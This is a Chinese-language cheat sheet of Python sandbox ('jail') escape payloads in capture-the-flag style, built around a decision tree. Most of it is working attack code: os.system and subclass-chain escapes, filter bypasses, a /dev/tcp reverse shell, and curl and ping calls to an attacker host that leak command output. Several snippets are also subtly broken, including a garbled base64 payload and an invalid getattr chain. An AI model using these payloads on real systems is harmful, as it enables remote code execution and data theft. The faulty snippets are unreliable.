# Python Jail 逃逸大全

## 逃逸决策树

```
输入被 eval/exec
├── 能否 import?
│   ├── 能 → __import__('os').system('id')
│   └── 不能 → 找 builtins
├── 能否访问 __builtins__?
│   ├── 能 → 利用 __builtins__ 找可用函数
│   └── 不能 → 找其他引用链
├── 是否有过滤?
│   ├── 过滤下划线 → 找无下划线函数
│   ├── 过滤引号 → 用 StringIO/chr()
│   └── 过滤方括号 → 用 .format() 或 getattr
└── 字符限制?
    ├── 只有字母 → 用 chr() 构造任意字符
    ├── 长度限制 → 短 payload
    └── 只允许数字 → 复杂编码
```

## 基础逃逸链

### 1. 直接执行命令
```python
__import__('os').system('id')
__import__('os').popen('id').read()
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### 2. 通过 builtins
```python
__builtins__.__dict__['__import__']('os').system('id')
getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
```

### 3. 通过 func_globals
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

### 4. 通过 type()
```python
type(type(os))
(type.__subclasses__())
```

### 5. 通过 Warning/Exception
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
```

## 常见子类索引 (print 找索引)

```python
# 列出所有可用子类
print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])

# 或遍历找特定类
for i, c in enumerate([].__class__.__base__.__subclasses__()):
    print(i, c.__name__)
```

## 常用 Gadgets

| 类名 | 索引 | 用途 |
|------|------|------|
| `catch_warnings` | ~59 | 获取 `__builtins__` |
| `_io._IOBase` | ~80 | 文件操作 |
| `Popen` | ~200+ | 命令执行 |
| `subprocess.Popen` | 动态 | 命令执行 |

## 绕过过滤

### 下划线被过滤
```python
getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')

# 或用 request 对象（Flask）
request.environ['werkzeug.server.shutdown']
```

### 引号被过滤
```python
chr(95)*2  # '__'
# 或用 StringIO
import('so'[::-1], fromlist=['os']).system('id')
```

### 方括号被过滤
```python
getattr(__import__('os'), 'system')('id')
# 用 .__getattribute__ 代替 getattr
```

### 数字被过滤
```python
# 用 True/False 构造数字
True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
# True = 1, False = 0
```

### 长度限制
```python
# 最短的反弹 shell
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')

# 或 base64 解码执行
__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
```

## 常见过滤绕过字符集

| 绕过方法 | 适用字符 |
|---------|---------|
| `chr()` | 所有可见字符 |
| `hex()` / `oct()` | 数字构造 |
| `[::-1]` 反转 | `so"[::-1]` = `os` |
| `+` 拼接 | `'os'[0]+'stem'` |
| 变量赋值 | `c='o'+'s';__import__(c)` |

## 无回显检测
```python
# 如果命令执行无回显，用以下方式验证
__import__('os').system('curl http://attacker/?$(id)')
__import__('os').system('ping -c1 attacker.com')
```
